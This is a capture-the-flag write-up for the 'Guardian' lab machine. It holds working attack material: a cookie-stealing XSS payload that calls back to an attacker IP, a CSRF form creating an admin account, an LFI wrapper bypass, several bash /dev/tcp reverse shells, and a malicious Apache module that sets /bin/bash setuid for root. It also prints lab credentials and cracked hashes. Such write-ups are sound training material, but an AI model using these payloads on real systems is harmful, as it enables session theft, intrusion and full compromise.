## Guardian

### Lab Details 

- Difficulty: Hard
- Type: IDOR, XSS, Abuse CSRF Token, LFI, White Box Testing, Linux

#### Enumeration
- run `nmap` 
```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 9c:69:53:e1:38:3b:de:cd:42:0a:c8:6b:f8:95:b3:62 (ECDSA)
|_  256 3c:aa:b9:be:17:2d:5e:99:cc:ff:e1:91:90:38:b7:39 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://guardian.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
```
- found domain name `guardian.htb`
- enumerate web app on port 80
	- found email `admissions@guardian.htb` on home page
	- found subdomain when clicking on `Student Portal` - `portal.guardian.htb`
- enumerate subdomain `portal.guardian.htb`, there is a prompt to notify to checkout the `Portal Guide` click on the guide we are presented with  a `pdf` file at `http://portal.guardian.htb/static/downloads/Guardian_University_Student_Portal_Guide.pdf`
	- found email in the document `support@guardian.htb`
	- found default password `GU1234`
	- username field of the login form specifies the username format `GUXXXXXXX`
	- if we click on forget password, the username format changes to `GU2024001`, from this we can deduce that the username is probably generate by prefix `GU` + year e.g. 2024 and the index from 1 to N
- enumerate subdomains - only `portal` was found
- enumerate directories  - use `feroxbuster`
```bash
$ feroxbuster -u http://portal.guardian.htb/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt 

[####################] - 4m     62282/62282   283/s   http://portal.guardian.htb/ 
[####################] - 4m     62282/62282   237/s   http://portal.guardian.htb/admin/ 
[####################] - 4m     62282/62282   240/s   http://portal.guardian.htb/includes/ 
[####################] - 4m     62282/62282   261/s   http://portal.guardian.htb/config/ 
[####################] - 4m     62282/62282   241/s   http://portal.guardian.htb/javascript/ 
[####################] - 4m     62282/62282   262/s   http://portal.guardian.htb/static/ 
[####################] - 4m     62282/62282   251/s   http://portal.guardian.htb/models/ 
[####################] - 4m     62282/62282   247/s   http://portal.guardian.htb/vendor/ 
[####################] - 4m     62282/62282   260/s   http://portal.guardian.htb/student/ 
[####################] - 4m     62282/62282   243/s   http://portal.guardian.htb/static/downloads/ 
[####################] - 4m     62282/62282   238/s   http://portal.guardian.htb/static/styles/ 
[####################] - 4m     62282/62282   237/s   http://portal.guardian.htb/admin/reports/ 
[####################] - 4m     62282/62282   249/s   http://portal.guardian.htb/javascript/jquery/ 
[####################] - 4m     62282/62282   241/s   http://portal.guardian.htb/static/vendor/ 
[####################] - 4m     62282/62282   241/s   http://portal.guardian.htb/includes/admin/ 
[####################] - 4m     62282/62282   252/s   http://portal.guardian.htb/includes/student/ 
[####################] - 4m     62282/62282   240/s   http://portal.guardian.htb/admin/notices/ 
[####################] - 3m     62282/62282   302/s   http://portal.guardian.htb/vendor/composer/ 
[####################] - 2m     62282/62282   457/s   http://portal.guardian.htb/c/ 
[####################] - 2m     62282/62282   560/s   http://portal.guardian.htb/lecturer/notices/ 
[####################] - 2m     62282/62282   612/s   http://portal.guardian.htb/includes/lecturer/    
```
- searched for `.pdf,.txt,.php` file exertions at the domains, nothing found 

 
#### Initial Foothold 
- attempted brute forcing username and with the default password `GU1234` 
- generating a wordlist from `GU2000001` to `GU2025999` and brute forcing with `hydra` was not able to find a valid credential
- went back to `guardian.htb` and found three students under `Testimonials` with their student email which contains their student ID
![[student emails.png]]
- extract their id from their email and attempt to login again
```bash
GU0142023@guardian.htb
GU6262023@guardian.htb
GU0702025@guardian.htb
## id
GU0142023 
GU6262023
GU0702025
```
- only `GU0142023` work with `GU1234`
![[student dashboard.png]]
- enumerate the web app after signing in, and in assignments there is an upcoming assignment for `Statistics in Business`, click on view details we and we able to upload files there
![[assignment upload.png]]
- two extensions are `.docx` and `.xlsx` 
- enumerate further, in the url of the chat we see two ids of the users
- we can attempt perform IDOR over the ids 
- to do this we can run `ffuf` 
- first generate a list of ids
```bash
$ seq 20 > id.txt
```
- then run `ffuf`, we will need to provide out cookie as well for authenticated scan
```bash
### fuff duo wordlist scan

ffuf -u 'http://portal.guardian.htb/student/chat.php?chat_users[0]=FUZZ1&chat_users[1]=FUZZ2' -w id.txt:FUZZ1 -w id.txt:FUZZ2 -mode clusterbomb -H 'Cookie: PHPSESSID=decsaeeth4ctk05hok7p50poto' -fw 2176,2768,2773,2763,2770
```
- we will need to sieve through the chat histories 
- between the chat of user id `1` and `2` we get the password to `gitea` for user `jamil.enockson`
![[gitea password.png]]
- add `gitea.guardian.htb` to `/etc/hosts` and visit `gitea.guardian.htb` 
- attempt to login to `gitea` with user credential `jamil.enockson@guardian.htb` 
![[gitea repos.png]]
![[db connection.png]]
```php
## portal.guardian.htb/config/config.php
<?php
return [
    'db' => [
        'dsn' => 'mysql:host=localhost;dbname=guardiandb',
        'username' => 'root',
        'password' => 'Gu4rd14n_un1_1s_th3_b3st',
        'options' => []
    ],
    'salt' => '8Sb)tM1vs1SS'
];
```
![[composer.png]]
```bash
{
    "require": {
        "c": "3.7.0",
        "phpoffice/phpword": "^1.3"
    }
}
```
- search vulnerabilitiles in Github Advisory Database
![[Github Advisory Database.png]]
- found [`CVE-2025-22131`](https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-79xx-vf93-p7cx), according the CVE we can perform `XSS` attack by renaming additional sheet name with XSS payload
- however most app such as `libre calc` or `sheets` sets registrations on special characters when renaming a sheet
- we can use [treegrid](https://www.treegrid.com/FSheet) to rename the sheet
![[renaming sheet.png]]
- we can use a payload to fetch user cookie using below payload
```bash
"><img src=x onerror=fetch('http://10.10.14.82:8000/?cookie='+btoa(document.cookie))>
```
- we get user cookie
```bash
$ nc -lvnp 8000
listening on [any] 8000 ...
connect to [10.10.14.82] from (UNKNOWN) [10.129.237.248] 42964
GET /?cookie=UEhQU0VTU0lEPThlZ2w5c3JkbzJjcjFocTN1Mm9jYmpkYm5v HTTP/1.1
Host: 10.10.14.82:8000
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/139.0.0.0 Safari/537.36
Accept: */*
Origin: http://portal.guardian.htb
Referer: http://portal.guardian.htb/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
```
- decode this from `base64`, we the cookie
```bash
PHPSESSID=8egl9srdo2cr1hq3u2ocbjdbno
```
- replace the current cookie with the stolen cookie, we are logged in as `sammy.treat`
![[hijacking phpsessid.png]]
- the url has changed to `/lecturer` which mean we have `lecturer` access in the app
- lecturer access gives us the access to few more features
- navigate through the app, found `Create Notice` under `Notice Board` 
![[create notice.png]]
- states that the `Reference Link will be reviewed by an admin`
- test for XSS and we get connection back, payload `http://10.10.14.82:8000`
![[creating notice.png]]
```bash
$ nc -lvnp 8000
listening on [any] 8000 ...
connect to [10.10.14.82] from (UNKNOWN) [10.129.237.248] 35588
GET / HTTP/1.1
Host: 10.10.14.82:8000
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/139.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://portal.guardian.htb/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
```
- attempted to steal admin cookie however was not successful 
- since `XSS` works and its executed by admin user we can attempt to abuse `CSRF`
- checking page source and found `CSRF` token
![[csrf token.png]]
- create a malicious `html` page and serve it using `python http server`
- in the `html` page we will create a form that creates a new user with the `CSRF` token
- when admin click on the link the form will be submitted by admin 
- check `creauser.php` for details, the authentication mechanism is exit if user is not admin or not authenticated and since the admin is visiting the form thus is able to bypass and if without the `CRSF` token the post will be blocked
- further more, the `CRSF` token are stored in one location which means its not unique as long as the token is in the token pool its considered valid
![[new user form.png]]
- craft a malicious `html` file
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>CSRF Exploit</title>
</head>
<body>
<h1>CSRF Exploit Test</h1>
<form id="csrfForm" action="http://portal.guardian.htb/admin/createuser.php" method="POST">
    <input type="hidden" name="username" value="attacker">
    <input type="hidden" name="password" value="P@ssw0rd123">
    <input type="hidden" name="full_name" value="Attacker User">
    <input type="hidden" name="email" value="attacker@example.com">
    <input type="hidden" name="dob" value="1990-01-01">
    <input type="hidden" name="address" value="123 Hackers Street">
    <input type="hidden" name="user_role" value="admin">
    <input type="hidden" name="csrf_token" value="1e5bb9861bb543d1edcde166cebcfd0c">
</form>
<script>
    document.getElementById('csrfForm').submit();
</script>
</body>
</html>
```
![[Hard/Guardian/ssrf.png]]
```bash
$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.129.237.248 - - [24/Oct/2025 08:27:17] "GET /index.html HTTP/1.1" 200 -
```

![[Hard/Guardian/admin dash.png]]
- enumerate the app, and found that when fetching different reports from `Reports`, the reports are been fetched from the same location  at `report` parameter
- e.g. `http://portal.guardian.htb/admin/reports.php?report=reports/system.php` or `http://portal.guardian.htb/admin/reports.php?report=reports/academic.php`
- check `reports.php` for file routing and found the blocking mechanism , it filters for `..` if its exists anywhere in the string and `enrollment|academic|financial|system.php` must be suffix of the paramter
![[lfi filter.png]]
- attempt to bypass using `stream wrapper`
```
http://portal.guardian.htb/admin/reports.php?report=php://filter/convert.base64-encode/resource=reports/academic.php
```
![[wrapper test.png]]
- copy the output we can decode it from `base64`
```html
$ echo "PD9waHANCg0KDQokYWNhZGVtaWMgPSBbDQogICAgJ2F2ZXJhZ2VfZ3BhJyA9PiAzLjQyLA0<SNIP>" | base64 -d
<?php


$academic = [
    'average_gpa' => 3.42,
    'top_departments' => [
        'Computer Science' => 3.8,
        'Engineering' => 3.7,
        'Mathematics' => 3.6
    ],
    'faculty_count' => 120,
    'programs_offered' => 45
];
?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <title>Academic Report</title>
    <link href="../../static/vendor/tailwindcss/tailwind.min.css" rel="stylesheet">
</head>

<body class="bg-gray-100">
    <div class="flex">


        <div class="flex-1 p-10">
            <h1 class="text-2xl font-bold text-gray-800 mb-6">Academic Report</h1>
            <div class="bg-white p-6 rounded-lg shadow space-y-4">
                <p>Average GPA: <strong><?php echo $academic['average_gpa']; ?></strong></p>
                <p>Faculty Count: <strong><?php echo $academic['faculty_count']; ?></strong></p>
                <p>Programs Offered: <strong><?php echo $academic['programs_offered']; ?></strong></p>
                <div>
                    <h2 class="font-semibold mb-2">Top Departments</h2>
                    <ul class="list-disc list-inside text-gray-700">
                        <?php foreach ($academic['top_departments'] as $dept => $gpa): ?>
                            <li><?php echo "$dept - GPA: $gpa"; ?></li>
                        <?php endforeach; ?>
                    </ul>
                </div>
            </div>
        </div>
    </div>
</body>

</html>
```

![[test wrapper.png]]
![[rev shell via wrapper.png]]
- use below payload
```bash
$ echo KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTAuMTQuODIvNDQ0NCAwPiYxKQo= | base64 -d
(bash >& /dev/tcp/10.10.14.82/4444 0>&1)
```
- full payload
```bash
a=system("printf KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTAuMTQuODIvNDQ0NCAwPiYxKSY=|base64 -d|bash");
```
#### Lateral Movement (If any)

```bash
$ ss -tuln
Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:PortProcess
udp   UNCONN 0      0      127.0.0.53%lo:53         0.0.0.0:*          
udp   UNCONN 0      0            0.0.0.0:68         0.0.0.0:*          
tcp   LISTEN 0      70         127.0.0.1:33060      0.0.0.0:*          
tcp   LISTEN 0      511          0.0.0.0:80         0.0.0.0:*          
tcp   LISTEN 0      128          0.0.0.0:22         0.0.0.0:*          
tcp   LISTEN 0      4096       127.0.0.1:3000       0.0.0.0:*          
tcp   LISTEN 0      151        127.0.0.1:3306       0.0.0.0:*          
tcp   LISTEN 0      4096   127.0.0.53%lo:53         0.0.0.0:*          
tcp   LISTEN 0      128             [::]:22            [::]:* 
```

```bash
mysql -u root -pGu4rd14n_un1_1s_th3_b3st -h localhost
```

```sql
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| guardiandb         |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0.00 sec)
mysql> show tables;
+----------------------+
| Tables_in_guardiandb |
+----------------------+
| assignments          |
| courses              |
| enrollments          |
| grades               |
| messages             |
| notices              |
| programs             |
| submissions          |
| users                |
+----------------------+
9 rows in set (0.00 sec)
```

```sql
mysql> select username,password_hash from users;
+--------------------+------------------------------------------------------------------+
| username           | password_hash                                                    |
+--------------------+------------------------------------------------------------------+
| admin              | 694a63de406521120d9b905ee94bae3d863ff9f6637d7b7cb730f7da535fd6d6 |
| jamil.enockson     | c1d8dfaeee103d01a5aec443a98d31294f98c5b4f09a0f02ff4f9a43ee440250 |
| mark.pargetter     | 8623e713bb98ba2d46f335d659958ee658eb6370bc4c9ee4ba1cc6f37f97a10e |
| valentijn.temby    | 1d1bb7b3c6a2a461362d2dcb3c3a55e71ed40fb00dd01d92b2a9cd3c0ff284e6 |
| leyla.rippin       | 7f6873594c8da097a78322600bc8e42155b2db6cce6f2dab4fa0384e217d0b61 |
| perkin.fillon      | 4a072227fe641b6c72af2ac9b16eea24ed3751211fb6807cf4d794ebd1797471 |
| cyrus.booth        | 23d701bd2d5fa63e1a0cfe35c65418613f186b4d84330433be6a42ed43fb51e6 |
| sammy.treat        | c7ea20ae5d78ab74650c7fb7628c4b44b1e7226c31859d503b93379ba7a0d1c2 |
| crin.hambidge      | 9b6e003386cd1e24c97661ab4ad2c94cc844789b3916f681ea39c1cbf13c8c75 |
| myra.galsworthy    | ba227588efcb86dcf426c5d5c1e2aae58d695d53a1a795b234202ae286da2ef4 |
| mireielle.feek     | 18448ce8838aab26600b0a995dfebd79cc355254283702426d1056ca6f5d68b3 |
| vivie.smallthwaite | b88ac7727aaa9073aa735ee33ba84a3bdd26249fc0e59e7110d5bcdb4da4031a |
<SNIP>
```

```bash
$ hashcat -m 1410 -a 0 hashes_salt.txt /usr/share/wordlists/rockyou.txt 
## jamil.enockson
c1d8dfaeee103d01a5aec443a98d31294f98c5b4f09a0f02ff4f9a43ee440250:8Sb)tM1vs1SS:copperhouse56
## admin
694a63de406521120d9b905ee94bae3d863ff9f6637d7b7cb730f7da535fd6d6:8Sb)tM1vs1SS:fakebake000
```

```bash
$ su jamil
Password: 
jamil@guardian:/var/www/portal.guardian.htb/admin$ 
```

```bash
jamil@guardian:~$ id
uid=1000(jamil) gid=1000(jamil) groups=1000(jamil),1002(admins)
jamil@guardian:~$ find / -group admins 2>/dev/null
/opt/scripts/utilities
/opt/scripts/utilities/output
/opt/scripts/utilities/utils/attachments.py
/opt/scripts/utilities/utils/db.py
/opt/scripts/utilities/utils/status.py
/opt/scripts/utilities/utils/logs.py
/opt/scripts/utilities/utilities.py
```

```bash
jamil@guardian:~$ sudo -l
Matching Defaults entries for jamil on guardian:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User jamil may run the following commands on guardian:
    (mark) NOPASSWD: /opt/scripts/utilities/utilities.py
```

```bash
jamil@guardian:/opt/scripts/utilities/utils$ ls -la
total 24
drwxrwsr-x 2 root root   4096 Jul 10 14:20 .
drwxr-sr-x 4 root admins 4096 Jul 10 13:53 ..
-rw-r----- 1 root admins  287 Apr 19  2025 attachments.py
-rw-r----- 1 root admins  246 Jul 10 14:20 db.py
-rw-r----- 1 root admins  226 Apr 19  2025 logs.py
-rwxrwx--- 1 mark admins  253 Apr 26 09:45 status.py
```

```bash
$ cat status.py	
import platform
import psutil
import os

def system_status():
    print("System:", platform.system(), platform.release())
    print("CPU usage:", psutil.cpu_percent(), "%")
    print("Memory usage:", psutil.virtual_memory().percent, "%")
    os.system('bash -c "bash -i >& /dev/tcp/10.10.14.82/9002 0>&1"')
```

```bash
jamil@guardian:/opt/scripts/utilities$ sudo -u mark /opt/scripts/utilities/utilities.py system-status
System: Linux 5.15.0-152-generic
CPU usage: 0.0 %
Memory usage: 35.1 %
```

```bash
$ whoami
mark
```
#### Privilege Escalation

```bash
$ sudo -l
Matching Defaults entries for mark on guardian:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User mark may run the following commands on guardian:
    (ALL) NOPASSWD: /usr/local/bin/safeapache2ctl
```

```bash
$ sudo /usr/local/bin/safeapache2ctl
Usage: /usr/local/bin/c -f /home/mark/confs/file.conf
```

![[ghidra decompile.png]]

- write a malicious library in this case evil.c

```bash
$ cat evil.c
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

__attribute__((constructor)) void init() {
    setuid(0);
    system("chmod +s /bin/bash");
}

$ cat <<EOF > /home/mark/confs/exploit.conf
LoadModule evil_module /home/mark/confs/evil.so
EOF>

$ gcc -shared -fPIC -o /home/mark/confs/evil.so /home/mark/evil.c
$ ls
evil.so  exploit.conf
$ sudo /usr/local/bin/safeapache2ctl -f /home/mark/confs/exploit.conf
apache2: Syntax error on line 1 of /home/mark/confs/exploit.conf: Can't locate API module structure `evil_module' in file /home/mark/confs/evil.so: /home/mark/confs/evil.so: undefined symbol: evil_module
Action '-f /home/mark/confs/exploit.conf' failed.
The Apache error log may have more information.
$ ls -al /bin/bash
-rwsr-sr-x 1 root root 1396520 Mar 14  2024 /bin/bash
$ bash -p
bash-5.1# whoami
root

```
#### Resources

#### Lesson Learned
